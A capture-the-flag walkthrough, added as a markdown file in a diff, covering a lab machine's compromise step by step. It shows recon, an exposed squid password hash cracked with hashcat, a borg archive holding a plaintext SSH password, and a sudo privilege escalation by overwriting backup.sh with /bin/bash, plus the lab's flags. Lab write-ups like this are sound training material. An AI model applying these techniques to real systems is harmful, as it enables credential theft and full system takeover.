@@ -1,0 +1,128 @@
+nmap 
+```
+└─$ sudo nmap 10.10.105.182
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-07 10:42 PDT
+Nmap scan report for 10.10.105.182
+Host is up (0.19s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+gobuster scan results
+```
+```
+
+/admin/admin.html
+```
+ ############################################
+                ############################################
+                [Yesterday at 4.32pm from Josh]
+                Are we all going to watch the football game at the weekend??
+                ############################################
+                ############################################
+                [Yesterday at 4.33pm from Adam]
+                Yeah Yeah mate absolutely hope they win!
+                ############################################
+                ############################################
+                [Yesterday at 4.35pm from Josh]
+                See you there then mate!
+                ############################################
+                ############################################
+                [Today at 5.45am from Alex]
+                Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
+                I decided to give up like i always do ahahaha sorry about that.
+                I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
+                Might pass it over to the IT guys but in the meantime all the config files are laying about.
+                And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
+                other than that im pretty sure my backup "music_archive" is safe just to confirm.
+                ############################################
+                ############################################
+```
+
+names: `josh`, `adam`, `alex`
+
+http://10.10.105.182/etc/squid/squid.conf
+```
+auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
+auth_param basic children 5
+auth_param basic realm Squid Basic Authentication
+auth_param basic credentialsttl 2 hours
+acl auth_users proxy_auth REQUIRED
+http_access allow auth_users
+```
+
+http://10.10.105.182/etc/squid/passwd
+`music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`
+
+```
+└─$ ./hashcat.exe -a 0 -m 1600 ~/cyborg_hash.txt /usr/share/wordlists/rockyou.txt
+$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward  
+```
+
+`music_archive:squidward`
+
+So we downloaded a borg archive. I navigated to /home/gomez22/home/field/dev. 
+I then ran `└─$ borg list final_archive`, which gave the output...
+```
+Enter passphrase for key /home/gomez22/home/field/dev/final_archive: 
+music_archive                        Tue, 2020-12-29 06:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
+```
+
+Then I extracted the archive, using `squidward` as the password.
+```
+└─$ borg extract /home/gomez22/home/field/dev/final_archive::music_archive
+Enter passphrase for key /home/gomez22/home/field/dev/final_archive:
+```
+
+I navigated the archive into `/home/alex/Documents` where I found `note.txt`.
+```
+└─$ cat note.txt
+Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
+
+alex:S3cretP@s3
+```
+
+I was then able to ssh in as `alex:S3cretP@s3`.
+
+user.txt was in the working directory.
+`flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`
+
+I ran `sudo -l`
+```
+alex@ubuntu:~$ sudo -l
+Matching Defaults entries for alex on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alex may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+
+```
+
+linpeas.sh output
+```
+User & Groups: uid=1000(alex) gid=1000(alex) groups=1000(alex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)                 
+Hostname: ubuntu
+
+Sudo version 1.8.16
+
+/home/alex/bin:/home/alex/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+```
+
+in /etc/mp3backups
+`-r-xr-xr--   1 alex alex  1083 Dec 30  2020 backup.sh`
+
+I ran `chmod 777 backup.sh` and then I ran ...
+```
+alex@ubuntu:/etc/mp3backups$ echo "/bin/bash" > backup.sh
+alex@ubuntu:/etc/mp3backups$ cat *.sh
+/bin/bash
+alex@ubuntu:/etc/mp3backups$ clear
+alex@ubuntu:/etc/mp3backups$ sudo /etc/mp3backups/backup.sh
+root@ubuntu:/etc/mp3backups# 
+root@ubuntu:/etc/mp3backups# cat /root/root.txt
+flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
+```
